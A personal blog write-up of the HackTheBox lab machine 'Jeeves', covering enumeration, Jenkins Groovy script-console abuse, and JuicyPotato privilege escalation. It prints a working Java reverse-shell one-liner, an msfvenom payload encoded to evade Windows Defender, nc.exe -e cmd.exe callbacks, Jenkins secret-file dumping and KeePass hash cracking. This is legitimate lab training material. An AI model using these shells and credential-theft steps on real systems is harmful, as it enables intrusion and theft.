---
layout: post
title: "Jeeves Writeup - HackTheBox"
category: HackTheBox
---



# HTB lab Machine - Jeeves

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.1.109 folder that I have attached to this post.

## Enumeration summary

```
PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves

135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)

50000/tcp open  http         syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found

Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:freebsd:freebsd:6.2
```

```
Summary   : PoweredBy[Jetty://], HTTPServer[Jetty(9.4.z-SNAPSHOT)], Jetty[9.4.z-SNAPSHOT]
```

```
50000/tcp open  ibm-db2
```

![image-20210603124122790.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210603124122790.png)

The above is a picture btw.

## Exploitation

Found this exploit: https://www.exploit-db.com/exploits/46453 Did not work. So I ran some dirbuster on port 50000. Cam out with this interesting URL:

```
http://10.129.1.109:50000/askjeeves/
```

This gave me access to jenkins. Then I did this: https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6

Used this oneliner in the build section and started a listener:

```
String host="10.10.14.34";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

And user is ez:

```
C:\Users\kohsuke\Desktop>type user.txt
type user.txt
e3232272596fb47950d59c4cf1e7066a

```

## Privesc time

```
C:\Users\kohsuke\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```

```
C:\Users\kohsuke\Desktop>systeminfo
systeminfo

Host Name:                 JEEVES
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.10586 N/A Build 10586
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00331-20304-47406-AA297
Original Install Date:     10/25/2017, 4:45:33 PM
System Boot Time:          6/3/2021, 11:05:03 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,116 MB
Virtual Memory: Max Size:  2,687 MB
Virtual Memory: Available: 1,720 MB
Virtual Memory: In Use:    967 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 10 Hotfix(s) Installed.
                           [01]: KB3150513
                           [02]: KB3161102
                           [03]: KB3172729
                           [04]: KB3173428
                           [05]: KB4021702
                           [06]: KB4022633
                           [07]: KB4033631
                           [08]: KB4035632
                           [09]: KB4051613
                           [10]: KB4041689
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.1.109
                                 [02]: fe80::d44c:3167:a050:c1ee
                                 [03]: dead:beef::388e:7128:163:5635
                                 [04]: dead:beef::d44c:3167:a050:c1ee
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

Lets give juicypotato a try:

```
powershell.exe Invoke-WebRequest -Uri http://10.10.14.34/jp.exe -OutFile jp.exe

```

Generated reverse shell, but it got removed by windows defender. So I did this:

```
┌──(kali㉿kali)-[~/Desktop/DownloadedScripts]
└─$ msfvenom --platform Windows -p windows/x64/shell_reverse_tcp lhost=10.10.14.34 lport=9999 -e cmd/powershell_base64 -f exe > shell.exe
[-] No arch selected, selecting arch: x64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of cmd/powershell_base64
cmd/powershell_base64 succeeded with size 460 (iteration=0)
cmd/powershell_base64 chosen with final size 460
Payload size: 460 bytes
Final size of exe file: 7168 bytes

```

But when running juicypotato in this manner my shell.exe file still got deleted:

```
C:\Users\kohsuke\Desktop>jp.exe -t * -p shell.exe -l 9999
jp.exe -t * -p shell.exe -l 9999
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 9999
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[-] CreateProcessWithTokenW Failed to create proc: 2

[-] CreateProcessAsUser Failed to create proc: 2

C:\Users\kohsuke\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\kohsuke\Desktop

06/03/2021  01:01 PM    <DIR>          .
06/03/2021  01:01 PM    <DIR>          ..
06/03/2021  12:55 PM           347,648 jp.exe
11/03/2017  11:22 PM                32 user.txt
06/03/2021  12:31 PM                 7 yeet.txt
               3 File(s)        347,687 bytes
               2 Dir(s)   7,475,687,424 bytes free

C:\Users\kohsuke\Desktop>

```

So I decided to transfer nc.exe instead.

```
C:\Users\kohsuke\Desktop>jp.exe -t * -p nc.exe -a "-e cmd.exe 10.10.14.34 443" -l 443
jp.exe -t * -p nc.exe -a "-e cmd.exe 10.10.14.34 443" -l 443
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 443
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Users\kohsuke\Desktop>

```

This did not work. So I went to windows exploit suggester using the systeminformation of before;

```
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*]
[E] MS16-129: Cumulative Security Update for Microsoft Edge (3199057) - Critical
[*]   https://www.exploit-db.com/exploits/40990/ -- Microsoft Edge (Windows 10) - 'chakra.dll' Info Leak / Type Confusion Remote Code Execution
[*]   https://github.com/theori-io/chakra-2016-11
[*]
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*]
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*]
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*]
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*]
[E] MS16-056: Security Update for Windows Journal (3156761) - Critical
[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)
[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption
[*]
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*]
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*]
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*]
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*]
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
[*]
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*]
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*]
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*]
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
[*]
[*] done

```

Starting from the top: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135 Exe got deleted by AV. Cant find encoded one yet. None of thje others worked. WinPEAS TIme:

```
 [+] LSA Protection
   [?] If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection
    LSA Protection is not enabled

```

```
  [+] Credentials Guard
   [?] If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
    CredentialGuard is not enabled
  [X] Exception:   [X] 'Win32_DeviceGuard' WMI class unavailable

```

```
  [+] Cached Creds
   [?] If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials
    cachedlogonscount is 10

```

```
 [+] UAC Status
   [?] If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy:
    FilterAdministratorToken:
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.

```

```
 [+] Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    kohsuke::JEEVES:1122334455667788:d01b58819cdc9fb92518d8a4c14eb437:0101000000000000b95df1299d58d701ac7b9bd1ee8fd285000000000800300030000000000000000000000000300000e5dc81c715b665aa9ffd1136dbd2dd1240abab4fa0e5dd396890eed7ad50f73a0a00100000000000000000000000000000000000090000000000000000000000

```

```
  [+] Searching known files that can contain creds in home
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\kohsuke\NTUSER.DAT
    C:\Users\kohsuke\Documents\CEH.kdbx

```

This all did not work. So I thought simpeler and found some interesting files in the jenkins directory:

```
C:\Users\Administrator\.jenkins\secrets>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\.jenkins\secrets

06/03/2021  12:18 PM    <DIR>          .
06/03/2021  12:18 PM    <DIR>          ..
11/03/2017  10:33 PM    <DIR>          filepath-filters.d
06/03/2021  12:18 PM               272 hudson.console.AnnotatedLargeText.consoleAnnotator
12/24/2017  03:47 AM                48 hudson.console.ConsoleNote.MAC
06/03/2021  12:17 PM                32 hudson.model.Job.serverCookie
11/03/2017  10:33 PM               272 hudson.util.Secret
11/03/2017  10:33 PM                34 initialAdminPassword
11/03/2017  10:33 PM                32 jenkins.model.Jenkins.crumbSalt
11/03/2017  10:33 PM                48 jenkins.security.ApiTokenProperty.seed
11/03/2017  10:33 PM               256 master.key
11/03/2017  10:33 PM               272 org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY
11/03/2017  10:46 PM                 5 slave-to-master-security-kill-switch
11/03/2017  10:33 PM    <DIR>          whitelisted-callables.d
              10 File(s)          1,271 bytes
               4 Dir(s)   7,471,824,896 bytes free

C:\Users\Administrator\.jenkins\secrets>type master.key
type master.key
40e19a08d55698273e82182aae560bb78f5c99205e1b603de13e4729dfeed0bfaa9ed79557107ca7294a8a18a9bd81d60ee5610943e488bf2150dc1b06935b8f2a4f5b9370e0cb1d28249758e2b96cf2b658f2c5290fc6a202d9a04621c79eb0d09faf3246e50998a0aaea42b76eb96186f4842e0f9c07bbbd77152afc59de16
C:\Users\Administrator\.jenkins\secrets>type initialAdminPassword
type initialAdminPassword
ccd3bc435b3c4f80bea8acca28aec491

C:\Users\Administrator\.jenkins\secrets>

```

Went back to jenkins and logged in with admin:ccd3bc435b3c4f80bea8acca28aec491. Ran that shitty reverse shell creator in script console again, but now as admin:

```
String host="10.10.14.34";
int port=1235;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Was not system. Well back to juicy potato. For some reason juicypotato does not always run exe’s with -a flag. So here is a workaround:

```
echo c:\Users\kohsuke\Desktop\nc.exe 10.10.14.34 4455 -e cmd.exe > reverse.bat
```

Run the juicy tater again:

```
C:\Users\kohsuke\Desktop>jp.exe -t * -p reverse.bat -l 4455
jp.exe -t * -p reverse.bat -l 4455
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4455
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

```

Go to your listener:

```
C:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
C:\Users\Administrator\Desktop>whoami
whoami
nt authority\system

```

Huhm okay, look deeper. We have that kdbx file. We do some john the ripper magic to crack the database:

```
keepass2john CEH.kdbx > hash.txt
```

```
┌──(kali㉿kali)-[~/Desktop/DownloadedScripts]
└─$ john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)
1g 0:00:00:14 DONE (2021-06-03 09:06) 0.06770g/s 3722p/s 3722c/s 3722C/s nando1..moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

Open the database with password moonshine1 in keepasx:

![image-20210603150822437.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210603150822437.png)

And you have the flag: Sike just do this:

```
C:\Users\Administrator\Desktop>more < hm.txt:root.txt
more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530

```

## Exploitation

This box is more a hard 20 pointer then it is a 25 pointer. Did it in less then 3 hours without hints. Learned a new juicypotato bypass for -a flag.
